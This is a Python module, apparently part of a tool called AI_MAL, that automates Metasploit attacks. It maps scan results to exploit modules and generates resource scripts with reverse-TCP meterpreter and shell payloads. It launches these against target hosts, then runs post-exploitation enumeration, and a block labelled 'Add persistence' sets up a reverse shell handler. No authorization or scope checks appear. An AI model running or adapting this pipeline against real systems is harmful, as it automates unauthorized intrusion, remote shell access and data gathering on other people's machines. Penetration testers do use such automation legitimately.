#!/usr/bin/env python3
"""
Metasploit integration module for AI_MAL
"""

import asyncio
import json
import logging
import os
import re
from typing import Dict, List, Optional, Any
from datetime import datetime
import subprocess
from pathlib import Path

logger = logging.getLogger(__name__)

class MetasploitManager:
    def __init__(self, workspace: str = None):
        """Initialize the Metasploit manager"""
        # Set workspace name
        self.workspace = workspace or "AI_MAL_workspace"
        
        # Get MSF resources directory from environment variable or use default
        self.msf_resources_dir = os.getenv('MSF_RESOURCES_DIR', 'msf_resources')
        
        # Ensure msf_resources_dir is an absolute path if possible
        if not os.path.isabs(self.msf_resources_dir) and 'INSTALL_DIR' in os.environ:
            self.msf_resources_dir = os.path.join(os.environ['INSTALL_DIR'], self.msf_resources_dir)
        
        # Create MSF resources directory if it doesn't exist
        try:
            os.makedirs(self.msf_resources_dir, exist_ok=True)
            logger.info(f"Using MSF resources directory: {self.msf_resources_dir}")
        except Exception as e:
            logger.warning(f"Failed to create MSF resources directory: {str(e)}")
            # Fall back to current directory/msf_resources if we can't create the configured one
            fallback_dir = os.path.join(os.getcwd(), 'msf_resources')
            try:
                os.makedirs(fallback_dir, exist_ok=True)
                self.msf_resources_dir = fallback_dir
                logger.info(f"Using fallback MSF resources directory: {self.msf_resources_dir}")
            except Exception as fallback_error:
                logger.error(f"Failed to create fallback MSF resources directory: {str(fallback_error)}")
                # Last resort, just use the current directory
                self.msf_resources_dir = os.getcwd()
                logger.warning(f"Using current directory for MSF resources: {self.msf_resources_dir}")
        
        # Check if Metasploit is installed
        self._check_metasploit()
        
        # Define payload types based on target OS
        self.payloads = {
            'windows': {
                'meterpreter': 'windows/meterpreter/reverse_tcp',
                'shell': 'windows/shell/reverse_tcp',
                'vnc': 'windows/vncinject/reverse_tcp',
                'persistent': 'windows/persistence/reverse_tcp'
            },
            'linux': {
                'meterpreter': 'linux/x86/meterpreter/reverse_tcp',
                'shell': 'linux/x86/shell/reverse_tcp',
                'persistent': 'linux/x86/persistence/reverse_tcp'
            },
            'generic': {
                'meterpreter': 'generic/shell_reverse_tcp',
                'shell': 'generic/shell_reverse_tcp'
            }
        }

    def _check_metasploit(self):
        """Verify Metasploit is installed and available"""
        try:
            result = subprocess.run(['which', 'msfconsole'], 
                                  stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE, 
                                  text=True, 
                                  check=False)
            
            if result.returncode != 0:
                logger.warning("Metasploit Framework not found. Some features may not work.")
            else:
                logger.info(f"Metasploit Framework found at: {result.stdout.strip()}")
                
        except Exception as e:
            logger.warning(f"Error checking for Metasploit: {str(e)}")

    async def find_exploits(self, scan_results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Find potential Metasploit exploits based on scan results
        """
        try:
            exploits = []
            
            for host in scan_results.get('hosts', []):
                host_ip = host.get('ip')
                if not host_ip:
                    continue
                    
                for port in host.get('ports', []):
                    # Skip ports that are not open
                    if port.get('state', '') != 'open':
                        continue
                        
                    # Extract service info
                    service = port.get('service', '')
                    if not service:
                        continue
                        
                    service = str(service).lower()
                    version = port.get('version', '')
                    port_num = port.get('port')
                    
                    if not port_num:
                        continue
                    
                    # Skip common services that would generate too many results
                    if service in ['ssh', 'http', 'https'] and not version:
                        continue
                    
                    # Search for exploits based on service information
                    logger.info(f"Searching exploits for {service} {version} on port {port_num}")
                    service_exploits = await self._search_exploits(
                        service=service,
                        product=service.split()[0] if ' ' in service else service,
                        version=version
                    )
                    
                    if service_exploits:
                        # Add host and port info to each exploit
                        for exploit in service_exploits:
                            exploit['target_host'] = host_ip
                            exploit['target_port'] = port_num
                        
                        exploits.extend(service_exploits)
                        logger.info(f"Found {len(service_exploits)} potential exploits for {service}")
            
            # Sort exploits by rank (great, excellent, good)
            exploits.sort(key=lambda x: {
                'excellent': 0, 
                'great': 1, 
                'good': 2
            }.get(x.get('rank', '').lower(), 999))
            
            return exploits
            
        except Exception as e:
            logger.error(f"Error finding exploits: {str(e)}")
            return []

    async def run_exploits(self, exploits: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Run identified exploits using Metasploit"""
        try:
            results = []
            
            if not exploits:
                logger.warning("No exploits provided to run")
                return results
                
            for exploit in exploits:
                try:
                    if not exploit.get('target_host') or not exploit.get('target_port'):
                        logger.warning(f"Skipping exploit without target information: {exploit.get('name', 'unknown')}")
                        continue
                    
                    exploit_name = exploit.get('name', 'unknown')
                    logger.info(f"Preparing to run exploit {exploit_name}")
                    
                    # Generate resource script
                    resource_script = self._generate_resource_script(exploit)
                    
                    # Save resource script
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    safe_name = exploit_name.replace("/", "_").replace("\\", "_")
                    script_path = os.path.join(
                        self.msf_resources_dir,
                        f'exploit_{safe_name}_{timestamp}.rc'
                    )
                    
                    with open(script_path, 'w') as f:
                        f.write(resource_script)
                    
                    # Run exploit
                    logger.info(f"Running exploit {exploit_name} using resource script {script_path}")
                    result = await self._run_msf_console(script_path)
                    
                    # If successful, run post-exploitation
                    if result.get('status') == 'success':
                        post_result = await self._run_post_exploitation(exploit)
                        result['post_exploitation'] = post_result
                    
                    results.append({
                        "exploit": exploit,
                        "result": result,
                        "script_path": script_path
                    })
                except Exception as e:
                    logger.error(f"Error running exploit {exploit.get('name', 'unknown')}: {str(e)}")
                    results.append({
                        "exploit": exploit,
                        "result": {
                            "status": "error",
                            "error": str(e),
                            "output": "",
                            "duration": 0
                        },
                        "script_path": ""
                    })
            
            return results
            
        except Exception as e:
            logger.error(f"Error running exploits: {str(e)}")
            return []

    # Add alias method to match the function call in main.py
    async def exploit_targets(self, exploits: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Alias for run_exploits to maintain compatibility with main.py
        """
        return await self.run_exploits(exploits)

    async def _search_exploits(
        self,
        service: str,
        product: str,
        version: str
    ) -> List[Dict[str, Any]]:
        """
        Search for exploits in Metasploit
        """
        try:
            # Clean up search terms
            service = service.strip().split()[0]  # Use just the first word
            product = product.strip()
            version = version.strip()
            
            # Build search query
            search_terms = []
            if service:
                search_terms.append(service)
            if product and product != service:
                search_terms.append(product)
            if version:
                search_terms.append(version)
                
            if not search_terms:
                return []
                
            search_query = " ".join(search_terms)
            
            # Build search command - use -o to get a better formatted output (requires newer MSF versions)
            cmd = [
                'msfconsole',
                '-q',
                '-x',
                f'search type:exploit {search_query} -o /tmp/msf_search_results.txt; cat /tmp/msf_search_results.txt; exit -y'
            ]
            
            # Run search
            logger.debug(f"Running MSF search command: {' '.join(cmd)}")
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            output = stdout.decode()
            
            if process.returncode != 0 or "Error:" in output:
                logger.error(f"Exploit search failed: {stderr.decode()}")
                return []
            
            # Parse results
            results = []
            lines = output.strip().split('\n')
            
            # Find the line with search results header
            header_index = -1
            for i, line in enumerate(lines):
                if "Matching Modules" in line or "=" * 10 in line:
                    header_index = i
                    break
            
            if header_index == -1 or header_index + 1 >= len(lines):
                # Try an alternative approach - direct regex
                exploit_pattern = re.compile(r'(exploit/[^\s]+|auxiliary/[^\s]+)\s+([^\s]+)\s+([^\s]+)\s+(.+)')
                for line in lines:
                    match = exploit_pattern.search(line)
                    if match:
                        module_name, disclosure_date, rank, description = match.groups()
                        results.append({
                            "name": module_name.strip(),
                            "disclosure_date": disclosure_date.strip(),
                            "rank": rank.strip(),
                            "description": description.strip()
                        })
                return results
                
            # Skip header lines
            parsing_lines = lines[header_index + 2:]
            
            # For MSF6+ output format, try to identify the columns first
            column_headers = None
            for i, line in enumerate(parsing_lines):
                if re.search(r'^\s*#\s+Name\s+Disclosure\s+Date\s+Rank\s+Check\s+Description\s*$', line):
                    column_headers = i
                    break
                    
            # If we found column headers, use a more structured approach
            if column_headers is not None and column_headers + 1 < len(parsing_lines):
                # Skip the header and the separator line
                for line in parsing_lines[column_headers + 2:]:
                    # Skip empty lines
                    if not line.strip():
                        continue
                        
                    # Metasploit 6+ format: # Name Disclosure Date Rank Check Description
                    # Extract by finding the module path first as an anchor point
                    module_match = re.search(r'(exploit/\S+|auxiliary/\S+)', line)
                    if module_match:
                        module_name = module_match.group(1)
                        
                        # Remove the module name from the line for easier parsing
                        remaining = line[line.find(module_name) + len(module_name):].strip()
                        
                        # Now extract date, rank, and description
                        # Look for a date first (yyyy-mm-dd format)
                        date_match = re.search(r'\d{4}-\d{2}-\d{2}', remaining)
                        if date_match:
                            disclosure_date = date_match.group(0)
                            # Remove date from the remaining string
                            remaining = remaining[remaining.find(disclosure_date) + len(disclosure_date):].strip()
                            
                            # Next word should be rank
                            rank_match = re.search(r'^(\S+)', remaining)
                            if rank_match:
                                rank = rank_match.group(1)
                                
                                # Check if we have a "yes/no" check field to skip
                                remaining = remaining[remaining.find(rank) + len(rank):].strip()
                                check_match = re.search(r'^(Yes|No)', remaining)
                                if check_match:
                                    remaining = remaining[remaining.find(check_match.group(0)) + len(check_match.group(0)):].strip()
                                
                                # The rest is the description
                                description = remaining.strip()
                                
                                results.append({
                                    "name": module_name,
                                    "disclosure_date": disclosure_date,
                                    "rank": rank,
                                    "description": description
                                })
            else:
                # Fallback to the regular parsing for older MSF versions
                for line in parsing_lines:
                    # Skip empty lines or header lines
                    if not line.strip() or "=" in line or "Matching Modules" in line:
                        continue
                        
                    # Fix common formatting issues in MSF output
                    line = re.sub(r'\s+', ' ', line.strip())
                    
                    # Use regex to parse different output formats
                    if 'exploit/' in line or 'auxiliary/' in line:
                        try:
                            # Try different parsing patterns
                            # Pattern 1: module_name date rank description
                            match = re.match(r'^(\S+)\s+(\d{4}-\d{2}-\d{2})\s+(\S+)\s+(.+)$', line)
                            if match:
                                module_name, disclosure_date, rank, description = match.groups()
                            else:
                                # Pattern 2: index module_name date rank description
                                match = re.match(r'^\s*(\d+)\s+(\S+)\s+(\d{4}-\d{2}-\d{2})\s+(\S+)\s+(.+)$', line)
                                if match:
                                    _, module_name, disclosure_date, rank, description = match.groups()
                                else:
                                    # Fallback pattern: Try to extract module path
                                    module_match = re.search(r'(exploit/\S+|auxiliary/\S+)', line)
                                    if module_match:
                                        module_name = module_match.group(1)
                                        # Extract other parts
                                        parts = line.split(module_name, 1)[1].strip().split(None, 2)
                                        if len(parts) >= 3:
                                            disclosure_date, rank, description = parts
                                        else:
                                            disclosure_date = "unknown"
                                            rank = "normal" 
                                            description = line.split(module_name, 1)[1].strip()
                                    else:
                                        # Skip this line if we can't parse it
                                        continue
                            
                            # Clean up and normalize the data
                            module_name = module_name.strip()
                            disclosure_date = disclosure_date.strip() if disclosure_date else "unknown"
                            rank = rank.strip() if rank else "normal"
                            description = description.strip() if description else "No description available"
                            
                            results.append({
                                "name": module_name,
                                "disclosure_date": disclosure_date,
                                "rank": rank,
                                "description": description
                            })
                        except Exception as e:
                            logger.warning(f"Error parsing line '{line}': {str(e)}")
                            continue
            
            # Deduplicate results
            seen = set()
            unique_results = []
            for result in results:
                name = result["name"]
                if name not in seen:
                    seen.add(name)
                    unique_results.append(result)
            
            return unique_results
            
        except Exception as e:
            logger.error(f"Error searching exploits: {str(e)}")
            return []

    def _get_payload(self, target_os: str, payload_type: str = 'meterpreter') -> str:
        """Get appropriate payload based on target OS and type"""
        try:
            if target_os.lower() in self.payloads:
                return self.payloads[target_os.lower()].get(payload_type, self.payloads['generic']['meterpreter'])
            return self.payloads['generic']['meterpreter']
        except Exception as e:
            logger.error(f"Error getting payload: {str(e)}")
            return self.payloads['generic']['meterpreter']

    def _generate_resource_script(self, exploit: Dict[str, Any]) -> str:
        """Generate Metasploit resource script for an exploit"""
        try:
            target_host = exploit.get('target_host', '127.0.0.1')
            target_port = exploit.get('target_port', '')
            local_ip = self._get_local_ip()
            target_os = exploit.get('target_os', 'generic').lower()
            payload_type = exploit.get('payload_type', 'meterpreter')
            
            script = f"""# Resource script for {exploit['name']}
# Generated on {datetime.now().isoformat()}

# Set workspace
workspace -a {self.workspace}
workspace -s {self.workspace}

# Load the exploit
use {exploit['name']}

# Set target information
set RHOSTS {target_host}
"""
            
            if target_port:
                script += f"set RPORT {target_port}\n"
                
            if 'exploit/' in exploit['name']:
                payload = self._get_payload(target_os, payload_type)
                script += f"""
# Set payload information
set LHOST {local_ip}
set LPORT 4444
set PAYLOAD {payload}

# Set exploit options
set VERBOSE true
set ConsoleLogging true

# Run the exploit
exploit -j
"""
            else:
                script += """
# Set module options
set VERBOSE true
set ConsoleLogging true

# Run the module
run
"""
            
            return script
            
        except Exception as e:
            logger.error(f"Error generating resource script: {str(e)}")
            return f"# Error generating script: {str(e)}"

    def _get_local_ip(self) -> str:
        """
        Get local IP address
        """
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            logger.error(f"Error getting local IP: {str(e)}")
            return "127.0.0.1"

    async def _run_msf_console(self, resource_script: str) -> Dict[str, Any]:
        """
        Run Metasploit console with resource script
        
        Args:
            resource_script: Path to a resource script file or the script content
        """
        try:
            # Check if resource_script is a file path or script content
            if os.path.isfile(resource_script):
                script_path = resource_script
            else:
                # Create a temporary resource script file
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                script_path = os.path.join(self.msf_resources_dir, f'temp_{timestamp}.rc')
                with open(script_path, 'w') as f:
                    f.write(resource_script)
                logger.debug(f"Created temporary resource script at {script_path}")
            
            # Build command
            cmd = [
                'msfconsole',
                '-q',
                '-r',
                script_path
            ]
            
            # Run console
            logger.debug(f"Running MSF console command: {' '.join(cmd)}")
            start_time = datetime.now()
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Set a timeout for MSF console (5 minutes)
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
                output = stdout.decode()
                error = stderr.decode()
                
                end_time = datetime.now()
                duration = (end_time - start_time).total_seconds()
                
                # Check for success indicators
                success = False
                if "Exploit completed" in output or "Meterpreter session" in output or "Command shell session" in output:
                    success = True
                    
                return {
                    "status": "success" if success else "completed",
                    "output": output,
                    "error": error,
                    "duration": duration
                }
                
            except asyncio.TimeoutError:
                # Kill the process if it times out
                try:
                    process.kill()
                except:
                    pass
                    
                return {
                    "status": "timeout",
                    "output": "Operation timed out after 5 minutes",
                    "error": "Timeout occurred",
                    "duration": 300
                }
            
        except Exception as e:
            logger.error(f"Error running MSF console: {str(e)}")
            return {
                "status": "error",
                "output": "",
                "error": str(e),
                "duration": 0
            }

    async def _run_post_exploitation(self, exploit: Dict[str, Any]) -> Dict[str, Any]:
        """Run post-exploitation modules after successful exploitation"""
        try:
            target_os = exploit.get('target_os', 'generic').lower()
            post_script = f"""# Post-exploitation script
# Generated on {datetime.now().isoformat()}

# Set workspace
workspace -a {self.workspace}
workspace -s {self.workspace}

# Run post-exploitation modules
"""
            
            # Add OS-specific post-exploitation modules
            if target_os == 'windows':
                post_script += """
# Windows post-exploitation
use post/windows/gather/enum_logged_on_users
run

use post/windows/gather/enum_applications
run

use post/windows/gather/enum_patches
run

use post/windows/gather/checkvm
run
"""
            elif target_os == 'linux':
                post_script += """
# Linux post-exploitation
use post/linux/gather/enum_system
run

use post/linux/gather/enum_network
run

use post/linux/gather/enum_users_history
run
"""
            
            # Add persistence
            post_script += """
# Add persistence
use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
"""
            
            # Save and run post-exploitation script
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            script_path = os.path.join(
                self.msf_resources_dir,
                f'post_exploit_{timestamp}.rc'
            )
            
            with open(script_path, 'w') as f:
                f.write(post_script)
            
            return await self._run_msf_console(script_path)
            
        except Exception as e:
            logger.error(f"Error running post-exploitation: {str(e)}")
            return {
                "status": "error",
                "error": str(e),
                "output": "",
                "duration": 0
            }

    def format_exploits_table(self, exploits: List[Dict[str, Any]]) -> str:
        """
        Format exploits as a plain text table with proper alignment
        """
        if not exploits:
            return "No exploits found."
            
        # Define column widths
        name_width = 30
        rank_width = 10
        desc_width = 40
        total_width = name_width + rank_width + desc_width + 4  # +4 for separators
        
        # Create header
        header = f"{'Name':<{name_width}} | {'Rank':<{rank_width}} | {'Description':<{desc_width}}"
        separator = "-" * total_width
        
        # Build table
        table = [f"Potential Exploits ({len(exploits)} found):", separator, header, separator]
        
        # Add rows (limit to 10)
        for exploit in exploits[:10]:
            name = exploit.get('name', 'Unknown')
            if len(name) > name_width - 3:
                name = name[:name_width-3] + "..."
                
            rank = exploit.get('rank', 'Unknown')
            description = exploit.get('description', 'No description')
            if len(description) > desc_width - 3:
                description = description[:desc_width-3] + "..."
                
            row = f"{name:<{name_width}} | {rank:<{rank_width}} | {description:<{desc_width}}"
            table.append(row)
            
        if len(exploits) > 10:
            table.append(separator)
            table.append(f"Showing 10 of {len(exploits)} exploits")
        else:
            table.append(separator)
            
        return "\n".join(table) 